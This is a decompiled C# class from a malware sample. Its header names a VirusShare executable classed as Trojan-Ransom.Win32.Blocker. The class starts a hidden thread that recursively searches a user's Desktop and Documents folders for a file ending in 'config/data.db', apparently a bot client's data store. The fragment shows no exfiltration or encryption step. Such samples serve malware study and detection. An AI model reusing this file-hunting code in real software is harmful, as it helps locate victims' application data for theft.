// Decompiled with JetBrains decompiler
// Type: PHP_Bot.RS.Bots.Nexus
// Assembly: PHP Bot, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4A73DBBE-CCD6-4C8A-915B-72A41BF05981
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00015-msil\Trojan-Ransom.Win32.Blocker.dfxz-5587203fc5e9b0dd6b0d3d299a783862a2204a5dd7f175fb859be97a0e6568ae.exe

using System;
using System.IO;
using System.Threading;

namespace PHP_Bot.RS.Bots
{
  internal class Nexus
  {
    private string dir;
    public bool isDone = false;

    public string GetDirectory => this.dir;

    public bool UsesNexus => File.Exists(this.dir);

    public Nexus() => new Thread(new ThreadStart(this.FileFinder)).Start();

    private void FileFinder()
    {
      this.Search(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory));
      this.Search(Environment.GetFolderPath(Environment.SpecialFolder.Personal));
      this.Search(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
      this.isDone = true;
    }

    private void Search(string pathName)
    {
      try
      {
        foreach (string file in Directory.GetFiles(pathName))
        {
          if (file.Replace("\\", "/").EndsWith("config/data.db"))
            this.dir = file;
        }
        foreach (string directory in Directory.GetDirectories(pathName))
          this.Search(directory);
      }
      catch
      {
      }
    }
  }
}
